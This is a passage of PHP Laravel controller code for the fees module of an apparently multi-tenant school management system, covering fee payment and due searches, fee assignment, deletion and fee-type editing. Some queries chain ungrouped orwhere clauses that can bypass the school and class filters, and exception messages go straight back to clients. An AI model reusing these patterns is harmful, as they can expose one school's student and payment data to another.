                ->join('aramisc_fees_types', 'aramisc_fees_payments.fees_type_id', '=', 'aramisc_fees_types.id')
                ->join('aramisc_classes', 'aramisc_students.class_id', '=', 'aramisc_classes.id')
                ->join('aramisc_sections', 'aramisc_students.section_id', '=', 'aramisc_sections.id')
                ->where('aramisc_students.class_id', $request->class)
                ->where('aramisc_students.section_id', $request->section)
                ->orwhere('aramisc_students.full_name', '%' . @$request->keyword . '%')
                ->orwhere('aramisc_students.admission_no', '%' . @$request->keyword . '%')
                ->orwhere('aramisc_students.roll_no', '%' . @$request->keyword . '%')
                ->select('aramisc_fees_payments.*', 'aramisc_students.full_name', 'aramisc_classes.class_name', 'aramisc_fees_groups.name', 'aramisc_fees_types.name as fees_type_name')
                ->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($fees_payments, null);
            }

            return view('backEnd.feesCollection.search_fees_payment', compact('fees_payments', 'classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_feesPaymentSearch(Request $request,$school_id)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'class' => 'required',
            'section' => 'required',

        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $classes = AramiscClass::where('active_status', 1)->where('school_id',$school_id)->get();
            $fees_payments = DB::table('aramisc_fees_payments')
                ->join('aramisc_students', 'aramisc_fees_payments.student_id', '=', 'aramisc_students.id')
                ->join('aramisc_fees_masters', 'aramisc_fees_payments.fees_type_id', '=', 'aramisc_fees_masters.fees_type_id')
                ->join('aramisc_fees_groups', 'aramisc_fees_masters.fees_type_id', '=', 'aramisc_fees_groups.id')
                ->join('aramisc_fees_types', 'aramisc_fees_payments.fees_type_id', '=', 'aramisc_fees_types.id')
                ->join('aramisc_classes', 'aramisc_students.class_id', '=', 'aramisc_classes.id')
                ->join('aramisc_sections', 'aramisc_students.section_id', '=', 'aramisc_sections.id')
                ->where('aramisc_students.class_id', $request->class)
                ->where('aramisc_students.section_id', $request->section)
                ->where('aramisc_students.school_id', $request->school_id)
                ->orwhere('aramisc_students.full_name', '%' . @$request->keyword . '%')
                ->orwhere('aramisc_students.admission_no', '%' . @$request->keyword . '%')
                ->orwhere('aramisc_students.roll_no', '%' . @$request->keyword . '%')
                ->select('aramisc_fees_payments.*', 'aramisc_students.full_name', 'aramisc_classes.class_name', 'aramisc_fees_groups.name', 'aramisc_fees_types.name as fees_type_name')
                ->where('aramisc_fees_payments.school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($fees_payments, null);
            }

            return view('backEnd.feesCollection.search_fees_payment', compact('fees_payments', 'classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function search_Fees_Payment(Request $request)
    {
        try {
            $fees_payments = AramiscFeesPayment::get();
            $classes = AramiscClass::where('active_status', 1)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($fees_payments, null);
            }
            return view('backEnd.feesCollection.search_fees_payment', compact('fees_payments', 'classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_search_Fees_Payment(Request $request, $school_id)
    {
        try {
            $fees_payments = AramiscFeesPayment::where('school_id',$school_id)->get();
            $classes = AramiscClass::where('active_status', 1)->where('school_id',$school_id)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($fees_payments, null);
            }
            return view('backEnd.feesCollection.search_fees_payment', compact('fees_payments', 'classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function searchFeesDue(Request $request)
    {
        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $fees_masters = AramiscFeesMaster::select('fees_group_id')->where('active_status', 1)->distinct('fees_group_id')->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['fees_masters'] = $fees_masters->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.feesCollection.search_fees_due', compact('classes', 'fees_masters'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_searchFeesDue(Request $request, $school_id)
    {
        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();
            $fees_masters = AramiscFeesMaster::select('fees_group_id')->where('active_status', 1)->distinct('fees_group_id')->where('school_id',$school_id)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['fees_masters'] = $fees_masters->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.feesCollection.search_fees_due', compact('classes', 'fees_masters'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function feesDueSearch(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'fees_group' => 'required',
            'class' => 'required',
            'section' => 'required',
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $fees_group = explode('-', $request->fees_group);

            $fees_master = AramiscFeesMaster::select('id', 'amount')->where('fees_group_id', $fees_group[0])->where('fees_type_id', $fees_group[1])->first();
            if ($fees_group[0] != 1 && $fees_group[0] != 2) {
                $students = AramiscStudent::where('class_id', $request->class)->where('section_id', $request->section)->get();
            } else {
                if ($fees_group[0] == 1) {
                    $students = AramiscStudent::where('class_id', $request->class)->where('section_id', $request->section)->where('route_list_id', '!=', '')->get();
                } else {
                    $students = AramiscStudent::where('class_id', $request->class)->where('section_id', $request->section)->where('room_id', '!=', '')->get();
                }
            }

            $fees_dues = [];


            foreach ($students as $student) {

                $fees_master = AramiscFeesMaster::select('id', 'amount')->where('fees_group_id', $fees_group[0])->where('fees_type_id', $fees_group[1])->first();
                $total_amount = $fees_master->amount;


                $fees_assign = AramiscFeesAssign::where('student_id', $student->id)->where('fees_master_id', $fees_master->id)->first();
                $discount_amount = AramiscFeesPayment::where('student_id', $student->id)->where('fees_type_id', $fees_group[1])->sum('discount_amount');
                $amount = AramiscFeesPayment::where('student_id', $student->id)->where('fees_type_id', $fees_group[1])->sum('amount');

                $paid = $discount_amount + $amount;

                if ($fees_assign != "") {
                    if ($total_amount > $paid) {
                        $fees_dues[] = $fees_assign;
                    }
                }
            }


            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $fees_masters = AramiscFeesMaster::select('fees_group_id')->where('active_status', 1)->distinct('fees_group_id')->get();

            $class_id = $request->class;
            $fees_group_id = $fees_group[1];

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['fees_masters'] = $fees_masters;
                $data['fees_dues'] = $fees_dues;
                $data['class_id'] = $class_id;
                $data['fees_group_id'] = $fees_group_id;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.feesCollection.search_fees_due', compact('classes', 'fees_masters', 'fees_dues', 'class_id', 'fees_group_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_feesDueSearch(Request $request,$school_id)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'fees_group' => 'required',
            'class' => 'required',
            'section' => 'required',
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $fees_group = explode('-', $request->fees_group);

            $fees_master = AramiscFeesMaster::select('id', 'amount')->where('fees_group_id', $fees_group[0])->where('fees_type_id', $fees_group[1])->where('school_id', $school_id)->first();
            if ($fees_group[0] != 1 && $fees_group[0] != 2) {
                $students = AramiscStudent::where('class_id', $request->class)->where('section_id', $request->section)->where('school_id', $school_id)->get();
            } else {
                if ($fees_group[0] == 1) {
                    $students = AramiscStudent::where('class_id', $request->class)->where('section_id', $request->section)->where('school_id', $school_id)->where('route_list_id', '!=', '')->get();
                } else {
                    $students = AramiscStudent::where('class_id', $request->class)->where('section_id', $request->section)->where('school_id', $school_id)->where('room_id', '!=', '')->get();
                }
            }

            $fees_dues = [];


            foreach ($students as $student) {

                $fees_master = AramiscFeesMaster::select('id', 'amount')->where('fees_group_id', $fees_group[0])->where('fees_type_id', $fees_group[1])->where('school_id', $school_id)->first();
                $total_amount = $fees_master->amount;



                $fees_assign = AramiscFeesAssign::where('student_id', $student->id)->where('fees_master_id', $fees_master->id)->where('school_id', $school_id)->first();
                $discount_amount = AramiscFeesPayment::where('student_id', $student->id)->where('fees_type_id', $fees_group[1])->where('school_id', $school_id)->sum('discount_amount');
                $amount = AramiscFeesPayment::where('student_id', $student->id)->where('fees_type_id', $fees_group[1])->where('school_id', $school_id)->sum('amount');

                $paid = $discount_amount + $amount;

                if ($fees_assign != "") {
                    if ($total_amount > $paid) {
                        $fees_dues[] = $fees_assign;
                    }
                }
            }


            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id', $school_id)->get();
            $fees_masters = AramiscFeesMaster::select('fees_group_id')->where('active_status', 1)->distinct('fees_group_id')->where('school_id', $school_id)->get();

            $class_id = $request->class;
            $fees_group_id = $fees_group[1];

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['fees_masters'] = $fees_masters;
                $data['fees_dues'] = $fees_dues;
                $data['class_id'] = $class_id;
                $data['fees_group_id'] = $fees_group_id;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.feesCollection.search_fees_due', compact('classes', 'fees_masters', 'fees_dues', 'class_id', 'fees_group_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function search_FeesDue(Request $request)
    {
        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $fees_masters = AramiscFeesMaster::select('fees_group_id')->where('active_status', 1)->distinct('fees_group_id')->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['fees_masters'] = $fees_masters->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.feesCollection.search_fees_due', compact('classes', 'fees_masters'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_search_FeesDue(Request $request, $school_id)
    {
        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();
            $fees_masters = AramiscFeesMaster::select('fees_group_id')->where('active_status', 1)->distinct('fees_group_id')->where('school_id',$school_id)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['fees_masters'] = $fees_masters->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.feesCollection.search_fees_due', compact('classes', 'fees_masters'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function deleteSingle(Request $request)
    {


        try {
            $id_key = 'fees_master_id';

            $tables = tableList::getTableList($id_key,$request->id);

            try {
                $delete_query = AramiscFeesMaster::destroy($request->id);
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    if ($delete_query) {
                        return ApiBaseMethod::sendResponse(null, 'Fees Master has been deleted successfully');
                    } else {
                        return ApiBaseMethod::sendError('Something went wrong, please try again.');
                    }
                } else {
                    if ($delete_query) {
                        Toastr::success('Operation successful', 'Success');
                        return redirect()->back();
                    } else {
                        Toastr::error('Operation Failed', 'Failed');
                        return redirect()->back();
                    }
                }
            } catch (\Illuminate\Database\QueryException $e) {
                $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';
                Toastr::error('This item already used', 'Failed');
                return redirect()->back();
            } catch (\Exception $e) {

                Toastr::error('Operation Failed', 'Failed');
                return redirect()->back();
            }
            $result = AramiscFeesMaster::destroy($request->id);
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Fees Master been deleted successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('fees-master');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_deleteSingle(Request $request, $school_id)
    {


        try {
            $id_key = 'fees_master_id';

            $tables = tableList::getTableList($id_key,$request->id);

            try {
                $delete_query = AramiscFeesMaster::where('school_id',$school_id)->destroy($request->id);
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    if ($delete_query) {
                        return ApiBaseMethod::sendResponse(null, 'Fees Master has been deleted successfully');
                    } else {
                        return ApiBaseMethod::sendError('Something went wrong, please try again.');
                    }
                } else {
                    if ($delete_query) {
                        Toastr::success('Operation successful', 'Success');
                        return redirect()->back();
                    } else {
                        Toastr::error('Operation Failed', 'Failed');
                        return redirect()->back();
                    }
                }
            } catch (\Illuminate\Database\QueryException $e) {
                $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';
                Toastr::error('This item already used', 'Failed');
                return redirect()->back();
            } catch (\Exception $e) {
                Toastr::error('Operation Failed', 'Failed');
                return redirect()->back();
            }
            $result = AramiscFeesMaster::destroy($request->id);
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Fees Master been deleted successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('fees-master');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function deleteGroup(Request $request)
    {
        try {
            $id_key = 'fees_master_id';

            $tables = tableList::getTableList($id_key,$request->id);

            try {
                $delete_query = AramiscFeesMaster::destroy($request->id);
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    if ($delete_query) {
                        return ApiBaseMethod::sendResponse(null, 'Fees Master has been deleted successfully');
                    } else {
                        return ApiBaseMethod::sendError('Something went wrong, please try again.');
                    }
                } else {
                    if ($delete_query) {
                        Toastr::success('Operation successful', 'Success');
                        return redirect()->back();
                    } else {
                        Toastr::error('Operation Failed', 'Failed');
                        return redirect()->back();
                    }
                }
            } catch (\Illuminate\Database\QueryException $e) {
                $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';
                Toastr::error('This item already used', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_deleteGroup(Request $request, $school_id)
    {
        try {
            $id_key = 'fees_master_id';

            $tables = tableList::getTableList($id_key,$request->id);

            try {
                $delete_query = AramiscFeesMaster::where('school_id',$school_id)->destroy($request->id);
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    if ($delete_query) {
                        return ApiBaseMethod::sendResponse(null, 'Fees Master has been deleted successfully');
                    } else {
                        return ApiBaseMethod::sendError('Something went wrong, please try again.');
                    }
                } else {
                    if ($delete_query) {
                        Toastr::success('Operation successful', 'Success');
                        return redirect()->back();
                    } else {
                        Toastr::error('Operation Failed', 'Failed');
                        return redirect()->back();
                    }
                }
            } catch (\Illuminate\Database\QueryException $e) {
                $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';
                Toastr::error('This item already used', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function feesAssign(Request $request, $id)
    {

        try {
            $fees_group_id = $id;
            $classes = AramiscClass::where('active_status', 1)->get();
            $genders = AramiscBaseSetup::where('active_status', '=', '1')->where('base_group_id', '=', '1')->get();
            $categories = AramiscStudentCategory::get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['categories'] = $categories->toArray();
                $data['genders'] = $genders->toArray();
                $data['fees_group_id'] = $fees_group_id;
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.feesCollection.fees_assign', compact('classes', 'categories', 'genders', 'fees_group_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_feesAssign(Request $request,$school_id, $id)
    {

        try {
            $fees_group_id = $id;
            $classes = AramiscClass::where('active_status', 1)->where('school_id',$school_id)->get();
            $genders = AramiscBaseSetup::where('active_status', '=', '1')->where('base_group_id', '=', '1')->where('school_id',$school_id)->get();
            $categories = AramiscStudentCategory::where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['categories'] = $categories->toArray();
                $data['genders'] = $genders->toArray();
                $data['fees_group_id'] = $fees_group_id;
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.feesCollection.fees_assign', compact('classes', 'categories', 'genders', 'fees_group_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function fees_Assign(Request $request, $id)
    {

        try {
            $fees_group_id = $id;
            $classes = AramiscClass::where('active_status', 1)->get();
            $genders = AramiscBaseSetup::where('active_status', '=', '1')->where('base_group_id', '=', '1')->get();
            $categories = AramiscStudentCategory::get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['categories'] = $categories->toArray();
                $data['genders'] = $genders->toArray();
                $data['fees_group_id'] = $fees_group_id;
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.feesCollection.fees_assign', compact('classes', 'categories', 'genders', 'fees_group_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_fees_Assign(Request $request, $school_id, $id)
    {

        try {
            $fees_group_id = $id;
            $classes = AramiscClass::where('active_status', 1)->where('school_id',$school_id)->get();
            $genders = AramiscBaseSetup::where('active_status', '=', '1')->where('base_group_id', '=', '1')->where('school_id',$school_id)->get();
            $categories = AramiscStudentCategory::where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['categories'] = $categories->toArray();
                $data['genders'] = $genders->toArray();
                $data['fees_group_id'] = $fees_group_id;
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.feesCollection.fees_assign', compact('classes', 'categories', 'genders', 'fees_group_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function feesAssignSearch(Request $request)
    {

        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $genders = AramiscBaseSetup::where('active_status', '=', '1')->where('base_group_id', '=', '1')->get();
            $categories = AramiscStudentCategory::get();
            $fees_group_id = $request->fees_group_id;

            $students = AramiscStudent::query();
            $students->where('active_status', 1);
            if ($request->class != "") {
                $students->where('class_id', $request->class);
            }
            if ($request->section != "") {
                $students->where('section_id', $request->section);
            }
            if ($request->category != "") {
                $students->where('student_category_id', $request->category);
            }
            if ($request->gender != "") {
                $students->where('gender_id', $request->gender);
            }
            if ($request->fees_group_id == 1) {
                $students->where('route_list_id', '!=', '');
            }
            if ($request->fees_group_id == 2) {
                $students->where('room_id', '!=', '');
            }
            $students = $students->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            $fees_masters = AramiscFeesMaster::where('fees_group_id', $request->fees_group_id)->get();

            $pre_assigned = [];
            foreach ($students as $student) {
                foreach ($fees_masters as $fees_master) {
                    $assigned_student = AramiscFeesAssign::select('student_id')->where('student_id', $student->id)->where('fees_master_id', $fees_master->id)->first();

                    if ($assigned_student != "") {
                        if (!in_array($assigned_student->student_id, $pre_assigned)) {
                            $pre_assigned[] = $assigned_student->student_id;
                        }
                    }
                }
            }

            $class_id = $request->class;
            $category_id = $request->category;
            $gender_id = $request->gender;

            $fees_assign_groups = AramiscFeesMaster::where('fees_group_id', $request->fees_group_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['categories'] = $categories->toArray();
                $data['genders'] = $genders->toArray();
                $data['students'] = $students->toArray();
                $data['fees_assign_groups'] = $fees_assign_groups->toArray();
                $data['fees_group_id'] = $fees_group_id;
                $data['pre_assigned'] = $pre_assigned;
                $data['class_id'] = $class_id;
                $data['category_id'] = $category_id;
                $data['gender_id'] = $gender_id;
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.feesCollection.fees_assign', compact('classes', 'categories', 'genders', 'students', 'fees_assign_groups', 'fees_group_id', 'pre_assigned', 'class_id', 'category_id', 'gender_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_feesAssignSearch(Request $request, $school_id)
    {

        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id', $school_id)->get();
            $genders = AramiscBaseSetup::where('active_status', '=', '1')->where('base_group_id', '=', '1')->where('school_id', $school_id)->get();
            $categories = AramiscStudentCategory::where('school_id', $school_id)->get();
            $fees_group_id = $request->fees_group_id;

            $students = AramiscStudent::query();
            $students->where('active_status', 1);
            if ($request->class != "") {
                $students->where('class_id', $request->class);
            }
            if ($request->section != "") {
                $students->where('section_id', $request->section);
            }
            if ($request->category != "") {
                $students->where('student_category_id', $request->category);
            }
            if ($request->gender != "") {
                $students->where('gender_id', $request->gender);
            }
            if ($request->fees_group_id == 1) {
                $students->where('route_list_id', '!=', '');
            }
            if ($request->fees_group_id == 2) {
                $students->where('room_id', '!=', '');
            }
            $students = $students->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id', $school_id)->get();

            $fees_masters = AramiscFeesMaster::where('fees_group_id', $request->fees_group_id)->where('school_id', $school_id)->get();

            $pre_assigned = [];
            foreach ($students as $student) {
                foreach ($fees_masters as $fees_master) {
                    $assigned_student = AramiscFeesAssign::select('student_id')->where('student_id', $student->id)->where('fees_master_id', $fees_master->id)->where('school_id', $school_id)->first();

                    if ($assigned_student != "") {
                        if (!in_array($assigned_student->student_id, $pre_assigned)) {
                            $pre_assigned[] = $assigned_student->student_id;
                        }
                    }
                }
            }

            $class_id = $request->class;
            $category_id = $request->category;
            $gender_id = $request->gender;

            $fees_assign_groups = AramiscFeesMaster::where('fees_group_id', $request->fees_group_id)->where('school_id', $school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['categories'] = $categories->toArray();
                $data['genders'] = $genders->toArray();
                $data['students'] = $students->toArray();
                $data['fees_assign_groups'] = $fees_assign_groups->toArray();
                $data['fees_group_id'] = $fees_group_id;
                $data['pre_assigned'] = $pre_assigned;
                $data['class_id'] = $class_id;
                $data['category_id'] = $category_id;
                $data['gender_id'] = $gender_id;
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.feesCollection.fees_assign', compact('classes', 'categories', 'genders', 'students', 'fees_assign_groups', 'fees_group_id', 'pre_assigned', 'class_id', 'category_id', 'gender_id'));
        } catch (\Exception$e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function fees_type_index(Request $request)
    {

        try {
            $fees_types = AramiscFeesType::get();
            $fees_groups = AramiscFeesGroup::get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($fees_types, null);
            }

            return view('backEnd.feesCollection.fees_type', compact('fees_types', 'fees_groups'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_fees_type_index(Request $request, $school_id)
    {

        try {
            $fees_types = AramiscFeesType::where('school_id',$school_id)->get();
            $fees_groups = AramiscFeesGroup::where('school_id',$school_id)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($fees_types, null);
            }

            return view('backEnd.feesCollection.fees_type', compact('fees_types', 'fees_groups'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function fees_type_store(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'name' => "required|max:50|unique:aramisc_fees_types",
            'fees_group' => "required|"
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $fees_type = new AramiscFeesType();
            $fees_type->name = $request->name;
            $fees_type->fees_group_id = $request->fees_group;
            $fees_type->description = $request->description;
            $result = $fees_type->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Fees type has been created successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    return redirect()->back()->with('message-success', 'Fees type has been created successfully');
                } else {
                    return redirect()->back()->with('message-danger', 'Something went wrong, please try again');
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_fees_type_store(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'name' => "required|max:50|unique:aramisc_fees_types",
            'fees_group' => "required",
            'school_id' => "required"
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $fees_type = new AramiscFeesType();
            $fees_type->name = $request->name;
            $fees_type->fees_group_id = $request->fees_group;
            $fees_type->description = $request->description;
            $fees_type->school_id = $request->school_id;
            $result = $fees_type->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Fees type has been created successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    return redirect()->back()->with('message-success', 'Fees type has been created successfully');
                } else {
                    return redirect()->back()->with('message-danger', 'Something went wrong, please try again');
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function fees_type_edit(Request $request, $id)
    {
        try {
            $fees_type = AramiscFeesType::find($id);
            $fees_types = AramiscFeesType::get();
            $fees_groups = AramiscFeesGroup::get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['fees_type'] = $fees_type->toArray();
                $data['fees_types'] = $fees_types->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.feesCollection.fees_type', compact('fees_type', 'fees_types', 'fees_groups'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_fees_type_edit(Request $request, $school_id, $id)
    {
        try {
            $fees_type = AramiscFeesType::where('school_id',$school_id)->find($id);
            $fees_types = AramiscFeesType::where('school_id',$school_id)->get();
            $fees_groups = AramiscFeesGroup::where('school_id',$school_id)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['fees_type'] = $fees_type->toArray();
                $data['fees_types'] = $fees_types->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.feesCollection.fees_type', compact('fees_type', 'fees_types', 'fees_groups'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function fees_type_update(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'name' =>  'required|max:50|unique:aramisc_fees_types,name,' . $request->id,
            'fees_group' => "required|"
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {
            $fees_type = AramiscFeesType::find($request->id);
            $fees_type->name = $request->name;
            $fees_type->fees_group_id = $request->fees_group;
            $fees_type->description = $request->description;
            $result = $fees_type->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
